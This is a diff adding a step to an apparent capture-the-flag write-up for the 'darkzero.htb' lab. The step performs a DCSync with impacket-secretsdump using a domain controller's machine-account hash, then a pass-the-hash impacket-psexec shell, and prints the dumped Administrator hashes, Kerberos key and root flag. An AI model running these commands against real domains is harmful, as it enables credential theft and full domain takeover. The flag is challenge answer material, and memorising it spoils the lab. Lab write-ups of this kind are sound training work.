@@ -4335,7 +4335,69 @@ NL$KM:fa36c7d5c082abb578e117f05e36135b...
 <br>
 </div>
 
+#### 4.16 — DCSync `darkzero.htb` and capture the root flag
 
+**Why this step:** The DC01 machine account holds directory replication rights by virtue of being a domain controller. Use it to replicate the Administrator credential, then authenticate with that hash to read the flag.
+
+**Commands:**
+
+bash
+
+```bash
+faketime "$(date -u -d '+7 hours' '+%Y-%m-%d %H:%M:%S')" impacket-secretsdump \
+  'darkzero.htb/DC01$@172.16.20.1' \
+  -hashes 'aad3b435b51404eeaad3b435b51404ee:686d06e419d66abfa5fefac2618cdcea' \
+  -just-dc-user Administrator
+```
+
+bash
+
+```bash
+faketime "$(date -u -d '+7 hours' '+%Y-%m-%d %H:%M:%S')" impacket-psexec \
+  'darkzero.htb/Administrator@172.16.20.1' \
+  -hashes 'aad3b435b51404eeaad3b435b51404ee:4d470bb7497acf3f5f5c2a11872e02ac'
+```
+
+```
+type C:\Users\Administrator\Desktop\root.txt
+```
+
+**Breakdown:**
+
+|Component|Purpose|Simple Explanation|
+|---|---|---|
+|`'darkzero.htb/DC01$@172.16.20.1'`|Authenticate as the DC's machine account — single-quoted|The `$` must be quoted or bash consumes it|
+|`-hashes 'LM:NT'`|Pass-the-hash authentication|Use the hash directly; no password needed|
+|`-just-dc-user Administrator`|Replicate one account only|Fetch just the account that matters|
+|`impacket-psexec`|Remote command execution via service creation|Get a shell on the target|
+
+**Result:**
+
+```
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:4d470bb7497acf3f5f5c2a11872e02ac:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:392e85853234728df1ca77a4b52cd64c0f8451df619187f93851afa0460e4a48
+```
+
+```
+[*] Found writable share ADMIN$
+[*] Uploading file nczgcKXz.exe
+[*] Creating service ePzu on 172.16.20.1.....
+Microsoft Windows [Version 10.0.26100.33158]
+
+C:\Windows\System32> type C:\Users\Administrator\Desktop\root.txt
+c19fe6604d0912d2a349a1cecc8e8635
+```
+
+**ROOT FLAG: `c19fe6604d0912d2a349a1cecc8e8635`**
+
+**Key findings:**
+
+- **Administrator NT hash for `darkzero.htb`: `4d470bb7497acf3f5f5c2a11872e02ac`.** Full domain administrator in the target forest.
+- DCSync succeeded where the forged ticket failed. The machine account's replication rights are intrinsic to its role; Backup Operators membership never conferred them.
+- `impacket-psexec` uploads a service binary to `ADMIN$` and creates a Windows service to execute it, yielding a SYSTEM shell. It is effective but noisy — the uploaded binary and created service are both logged, and Sysmon is deployed in this environment.
+- The complete forest pivot required four distinct credentials in sequence: krbtgt (ticket forgery) → forged TGT (SMB access) → DC01$ (replication) → Administrator (execution).
 <div align="center">
 <br>
 <br>
